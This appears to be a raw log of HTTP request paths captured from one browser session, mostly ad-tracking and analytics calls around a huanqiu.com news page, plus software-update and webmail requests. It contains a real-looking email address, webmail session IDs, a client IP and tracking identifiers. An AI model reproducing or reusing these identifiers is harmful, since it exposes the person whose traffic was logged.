+/ecom?adn=4&at=6&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=4&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=1880x469&psr=1920x1080&pss=1899x3688&qn=64993ff41e08cbf4&rad=&rs=301&rsi0=960&rsi1=90&rsi5=4&rss0=#FFFFFF&rss1=#FFFFFF&rss2=#0000ff&rss3=#444444&rss4=#008000&rss5=&rss6=#e10900&rss7=&scale=&skin=&td_id=9223372032564549863&tn=text_default_960_90&tpr=1417221923063&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959755
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=5&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2696x469&psr=1920x1080&pss=1899x3688&qn=4fd4c73ccb12bc6f&rad=&rs=301&rsi0=640&rsi1=180&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_6&stid=5&td_id=9223372032564529137&tn=baiduCustSTagLinkUnit&tpr=1417221923063&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959746
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=6&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2881x469&psr=1920x1080&pss=1899x3688&qn=34fb52961c7ecf11&rad=&rs=301&rsi0=640&rsi1=60&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_3&stid=5&td_id=9223372032564536650&tn=baiduCustSTagLinkUnit&tpr=1417221923063&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959623
+/cpro/ui/i.js
+/t/tanxssp.js
+/ecom?di=959956&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=8&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=2880x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=681&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ecom?di=959621&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=9&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_2.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&lcr=http://news.baidu.com/&ps=3688x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3688&pis=-1x-1&cfv=15&ccd=24&chi=2&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=684&tlm=1417221923&tcn=1417221923&tpr=1417221923063&dpt=none&coa=&baidu_id=
+/ui?api=config&tu=1592628&pic=38&callback=bd__cbs__j5kczm
+/ex?i=mm_18021420_2310348_27460204&cb=jsonp_callback_62984&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://world.huanqiu.com/photo/2014-11/2754043.html&cah=1032&caw=1920&ccd=24&ctz=8&chl=2&cja=1&cpl=36&cmm=55&cf=15.0&cg=a07c56037f3839b4427e72a4b8dd2480&pvid=a31ac0a3935f0a96e14e09f8792debfe&ai=0&ac=3749&prp=124487160&cas=prp&cbh=3688&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043_2.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/media/v1/0f000ZfQTXgUFf87fiSJes.jpg
+/Login
+/data/2.4.0.8/version.xml
+/ex?i=mm_18021420_2310348_27472111
+/ui?src=1000&k=Hello%20Kitty%E4%B8%BB%E9%A2%98%E5%85%AC%E5%9B%AD%E9%A6%96%E8%90%BD%E6%88%B7%E4%B8%AD%E5%9B%BD%20%E6%97%A5%E5%8D%A1%E9%80%9A%E6%96%87%E5%8C%96%E7%A7%AF%E6%9E%81%E5%85%A5%E5%8D%8E&iurl[]=http://himg2.huanqiu.com/attachment2010/2014/1129/20141129065328557.jpg&qid=rnq76s1417221923641&tu=1592628&width=800&height=532&opt=1&v=7&cached=0&pic=38&dri=1&callback=bd__cbs__mctqcl
+/data/2.4.0.8/brfversion.xml
+/data/brf2.dat_20141129080112
+/platform
+/msg?funcid=getusrnewmsgcnt&username=shengdexinqing@163.com
+/cgi-bin/mail_list?sid=L-BqX-DmjhlgCT9r&folderid=1&folderkey=1&page=0&s=inbox&topmails=0&showinboxtop=1&ver=178907.2&cachemod=maillist&cacheage=7200&r=
+/cgi-bin/getinvestigate?sid=L-BqX-DmjhlgCT9r
+/getnum?url=http://world.huanqiu.com/photo/2014-11/2754043_2.html&callback=bdShare.fn._getShare&type=load&t=1417221923755
+/dsp?pid=mm_18021420_2310348_27460204&bid=0a67f52300005479170e418a008516ef&nid=30121174&tanxssp_t=76827
+/t/tanxssp.js
+/yws/device_open/poll?device_id=PC4230ee2953733921f
+/cpro/exp/lupage/img/icon_14px.png
+/ta.htm?sp=0,1199312,1202496,mm_18021420_2310348_27460204,0a67f52300005479170e418a008516ef,9,oaeBW44YK4M=,218.75.123.171,0,0,27,,,1,300x250_65,1,world.huanqiu.com&f=0&tid=0&p=AQpn9SMAAFR5Fw5BigCFFu+X3JLgrG2szQ==&click=http://click.tanx.com/ct?tanx_k=173&tanx_e=nJrdKk68BWuq6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7wMUA19QiOI7kS9sWtpZOgd4ZwbVsxAHteiNwSIWg6SF6X3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcY1cPsknYPvRn2yLekYubki6Ald5PrMxthoFqtlOFNgat4gYS73KK6I%3d&tanx_u=
+/v.gif?pid=307&type=3071&sc=624,243,1920,1032&desturl=http://world.huanqiu.com/photo/2014-11/2754043_2.html&apitype=1&linkid=i329caexbbh&velo_load=18&velo_cssload=2&velo_jsLoad=18&cite_uid=&cite_type=1&cite_mini=0
+/ex?i=mm_18021420_2310348_27472111&cb=jsonp_callback_69633&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://world.huanqiu.com/photo/2014-11/2754043.html&cah=1032&caw=1920&ccd=24&ctz=8&chl=2&cja=1&cpl=36&cmm=55&cf=15.0&cg=be63e4c74acfcf9b09d0028c90f800c6&pvid=a31ac0a3935f0a96e14e09f8792debfe&ai=0&ac=2397&prl=124483163&cas=prl&cbh=3634&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043_2.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/public03/imageplus/sticker/html_3_with_delay.app.js?cacheTime=393673
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=249755312
+/x.gif?k=2001457&p=6r8aC&rt=2&ns=[M_ADIP]&ni=[M_IESID]&v=[M_LOC]&o=&cb=749003362
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/cgi-bin/mail_list?sid=L-BqX-DmjhlgCT9r&folderid=1&folderkey=-6&page=0&flag=add&kvclick=mail_list|mail_list_ad|inbox&t=mail_list_ad&ver=178907.2&cachemod=maillist&cacheage=7200&r=
+/wpad.dat
+/zh_CN/htmledition/images/skin_26/top_bg_list104473.gif
+/t.gif?tanx_nid=30121174&tanx_cm
+/adi/55;168;21?aip4332
+/pixel/sci?pid=3038&uid=5063496972576936782&redir=http://mlt01.com/mlcp.htm?media=acxiom&ntckid=#COOKIEID#
+/kb.gif?mvtype=110&ac=5063496972576936782
+/?tid=1008&type=1&uid=5063496972576936782
+/m.gif?a=&c=860010-2370010113&mcookie=5063496972576936782
+/?dspid=10015&dspuid=5063496972576936782&gettuid=1
+/cmp.htm?vid=5063496972576936782&ver=1
+/adx.php?c=cz1iY2M0OTBkNGIwMjEzNTI5AHQ9MTQxNzIyMTkwMwBzZT01AGJ1PTQAcHJpY2U9VkhrWER3QUZGOHg3akVwZ1c1SUE4cXpTVFNDSTliS0ZpOHRJdkEAY2htZD0xAGJkaWQ9NDc3OTA2NDU2QzAwQkE4MzI0MTYwQjVERDJFN0JGMjQAY3Byb2lkPTQ3NzkwNjQ1NkMwMEJBODMyNDE2MEI1REQyRTdCRjI0AHY9MQBpPWRhOTdhNjYy
+/public03/imageplus/tip.png
+/cpro/exp/other/img/TU_LU2.png
+/public03/imageplus/tip-back.png
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000abdcUjRbnitjkI4N000000.mLFW5Hf3nHb30A-Vu1YknHfsPHDvn1D3rj01Pj0knjRsP0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&start=1417221923327&site_api_loaded=1417221923639&opt=1&v=7&found=1417221923642&loading=1417221923644&loaded=1417221924014&render_loaded=1417221924217&ad_count=1&pg_rect=248_0_1899_947&img_rect=313_549_800_532&showed=1417221924269&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1592628&actionid=8
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=249755312
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000abdcUjRbnitjkI4N000000.mLFW5Hf3nHb30A-Vu1YknHfsPHDvn1D3rj01Pj0knjRsP0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&actionid=4&attach=0&time=1417221924269
+/tbcp.htm?tanx_ver=1&tanx_tid=oaeBW44YK4M=
+/cmp.htm?media=koolbao&ntckid=1ED69D7B427B75548D6D1E4002D91603
+/mlcp.htm?media=acxiom&ntckid=3d9a4a2c-27e6-414b-831b-e1218dbd102c
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.5904594927560538
+/dsp?pid=mm_18021420_2310348_27472111&bid=0a67f53900005479170f422d00023d46&nid=30121174&tanxssp_t=51626
+/u.gif?ts=8id&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=6&pp=1124,327&ps=1366,8282&u=none&txt=none
+/public03/imageplus/v2/dock/close.png
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.5904594927560538
+/c.gif?t=5&p=2&q=&ra=0.5743382775690407
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000abdcUjRbnitjkI4N000000.mLFW5Hf3nHb30A-Vu1YknHfsPHDvn1D3rj01Pj0knjRsP0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&actionid=1&attach=0&time=1417221924352
+/ta.htm?sp=0,1199312,1202496,mm_18021420_2310348_27472111,0a67f53900005479170f422d00023d46,9,oaeBW44YK4M=,218.75.123.171,0,0,27,,,1,300x250_65,1,world.huanqiu.com&f=0&tid=0&p=AQpn9TkAAFR5Fw9CLQACPUakXJg7p8uhSA==&click=http://click.tanx.com/ct?tanx_k=173&tanx_e=xrgtXoOtF96q6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7yO0J2Ka%2f%2bizMlgMvcn%2fIdE30UnnLBs41yiNwSIWg6SF6X3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcZrXkb6yGEGRn2yLekYubki6Ald5PrMxthoFqtlOFNgat4gYS73KK6I%3d&tanx_u=
+/cmpixel.htm?t=1&google_error=1
+/wh/o.htm?ltr=http://world.huanqiu.com/photo/2014-11/2754043.html
+/wh/o.htm?ltr=http://world.huanqiu.com/photo/2014-11/2754043.html&cf=u
+/data/2.4.0.8/brfversion.xml
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=466519577
+/x.gif?k=2001457&p=6r8aC&rt=2&ns=[M_ADIP]&ni=[M_IESID]&v=[M_LOC]&o=&cb=554589984
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=82498349&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/data/brf2.dat_20141129080112
+/t.gif?tanx_nid=30121174&tanx_cm
+/cmp.htm?vid=5063496972576936782&ver=1
+/adi/55;168;21?aip4332
+/pixel/sci?pid=3038&uid=5063496972576936782&redir=http://mlt01.com/mlcp.htm?media=acxiom&ntckid=#COOKIEID#
+/kb.gif?mvtype=110&ac=5063496972576936782
+/?tid=1008&type=1&uid=5063496972576936782
+/m.gif?a=&c=860010-2370010113&mcookie=5063496972576936782
+/?dspid=10015&dspuid=5063496972576936782&gettuid=1
+/hzsync.htm?sp=,,1199312,1202496,3&ext=,,,oaeBW44YK4M=&cb=466519577
+/tbcp.htm?tanx_ver=1&tanx_tid=oaeBW44YK4M=
+/cmp.htm?media=koolbao&ntckid=1ED69D7B427B75548D6D1E4002D91603
+/mlcp.htm?media=acxiom&ntckid=3d9a4a2c-27e6-414b-831b-e1218dbd102c
+/cmpixel.htm?t=1&google_error=1
+/wangwang/get_task.php?id=99999&vr=1.501000&th=1&it=3600&pv=0.000000&wv=0.000000
+/m.gif?a=&c=860010-2370010113&mcookie=5063496972576936782
+/fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=289&_=1417221924896
+/nova_fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=332&_=1417221924925
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.31.136
+/KsafeSpeedTest/ksafe/queryip.d?ip=119.188.46.8
+/KsafeSpeedTest/ksafe/queryip.d?ip=114.112.93.202
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.23.95
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.33.98
+/Login/self_information
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/a.js?ch=0&jk=2b2160a697635df7&n=hqcom_cpr&tu=u1364901&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=0&ah=0&pt=2086&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=248&left=0&total=1&rdm=1417221925230
+/a.js?did=4&ch=0&jk=64993ff41e08cbf4&tn=text_default_960_90&n=hqcom_cpr&js=c&tu=959755&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=960&ah=90&pt=2000&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=1826&left=469&total=5&rdm=1417221925252
+/a.js?did=5&ch=0&jk=4fd4c73ccb12bc6f&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959746&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=960&ah=180&pt=1995&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=2642&left=469&total=5&rdm=1417221925253
+/a.js?did=6&ch=0&jk=34fb52961c7ecf11&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959623&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=640&ah=60&pt=1992&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=2827&left=469&total=5&rdm=1417221925254
+/a.js?did=0&ch=0&jk=191b4bb8cbb9f714&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=130&ah=360&pt=1730&it=1795&vt=1795&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=398&left=1460&total=5&rdm=1417221925254
+/a.js?did=0&ch=0&jk=191b4bb8cbb9f714&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043_2.html&if=0&aw=130&ah=360&pt=1727&it=1795&vt=1795&csp=1920,1032&bcl=1899,947&pof=1899,3688&top=398&left=309&total=5&rdm=1417221925255
+/v.gif?pid=307&type=3075&l=1212&t=0&s=1212&v=278&f=0&r=http://world.huanqiu.com/photo/2014-11/2754043_2.html&u=http://comment.huanqiu.com/commentiframe.html
+/photo/2014-11/2754043_3.html
+/gdt_stats.fcg?viewid=_D8_t4K5I5MshpoTMhDZKuyCYy3SNvm3JmOAZeAgoLFuXwl3LiF9ppnzz91!O38MhDjE8atlQbT9j!EiQzTGGVkdOM_F_6Tl_talzsOGSYznz1!L8VBU5_pHK04EDRhUAD8n0JAttruEnKYVBkS0y4QZc2diDLYQxt_FxzuYNQ4u1hOZU5Un5NbL0GBaKOvgeUswPTvSWHymdHDbwiLF2CKIErfQN_tY&i=1&datatype=jsonp&callback=_cb_gdtjson2
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=2272,2272&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221910&nv=0&rnd=832292630&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://world.huanqiu.com/photo/2014-11/2754043.html&v=1.0.70&lv=2
+/gchatpic_new/2083596077/2083596077-2447021635-2C2F74804ACF50D6B62277877C6112C8/0?vuin=648629762&term=1
+/
+/attachment2010/2014/1129/20141129065328139.jpg
+/css/huanqiuTieStyles.css?&_i329ccc7
+/?c=hits&a=addHits&id=2754043&catid=127
+/cmspic/002/75/40/43_1.html?callback=setDivContent&_=1417221925543
+/h.js?1fc983b4c305d209e7e05d96e713939f
+/poll?r=0.8737089954380838&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.9755693429477703
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=2272,2272&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221910&nv=0&rnd=832292630&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://world.huanqiu.com/photo/2014-11/2754043.html&v=1.0.70&lv=2&u=http://world.huanqiu.com/photo/2014-11/2754043_2.html
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&et=0&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221910&nv=0&rnd=1435303999&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://world.huanqiu.com/photo/2014-11/2754043_2.html&v=1.0.70&lv=2
+/ecom?di=959951&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=54x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=340&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ecom?di=959952&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=2&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=1983x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=343&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ecom?di=959953&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=3&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=1995x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=346&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/information/progress
+/ecom?di=959755&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=4&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=1881x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=348&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ecom?di=959746&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=5&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=2697x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=351&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ecom?di=959623&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=6&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=2882x469&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=365&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/acom?di=u1364901&dcb=BAIDU_DUP2_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=1&dds=&drs=1&dvi=1414464365&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=0x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=5&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ex?i=mm_18021420_2310348_27460204
+/acom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=1&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=0x0&psr=1920x1080&pss=1899x3689&qn=b6ccccb585d1f8b3&rad=&rsi0=420&rsi1=350&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_12&stid=5&td_id=1364901&tn=baiduCustSTagLinkUnit&tpr=1417221925818&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=u1364901
+/ecom?di=1007910&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=7&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=3689x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=469&tlm=1417221925&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/information/progress
+/ecom?adn=4&at=6&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=4&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=1881x469&psr=1920x1080&pss=1899x3689&qn=21aecfe8b89ff343&rad=&rs=301&rsi0=960&rsi1=90&rsi5=4&rss0=#FFFFFF&rss1=#FFFFFF&rss2=#0000ff&rss3=#444444&rss4=#008000&rss5=&rss6=#e10900&rss7=&scale=&skin=&td_id=9223372032564549863&tn=text_default_960_90&tpr=1417221925818&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959755
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=5&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2697x469&psr=1920x1080&pss=1899x3689&qn=4178918c52bead3e&rad=&rs=301&rsi0=640&rsi1=180&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_6&stid=5&td_id=9223372032564529137&tn=baiduCustSTagLinkUnit&tpr=1417221925818&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959746
+/ecom?adn=0&at=103&aurl=&cad=1&ccd=24&cec=UTF-8&cfv=15&ch=0&col=zh-CN&conOP=0&cpa=1&dai=6&dis=0&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&lunum=6&n=hqcom_cpr&pcs=1899x947&pis=10000x10000&ps=2882x469&psr=1920x1080&pss=1899x3689&qn=11eecdff6d09510b&rad=&rs=301&rsi0=640&rsi1=60&rsi5=4&rss0=&rss1=&rss2=&rss3=&rss4=&rss5=&rss6=&rss7=&scale=&skin=tabcloud_skin_3&stid=5&td_id=9223372032564536650&tn=baiduCustSTagLinkUnit&tpr=1417221925818&ts=1&xuanting=0&dtm=BAIDU_DUP2_SETJSONADSLOT&dc=2&di=959623
+/t/tanxssp.js
+/
+/ui?api=config&tu=1592628&pic=38&callback=bd__cbs__t5y4pq
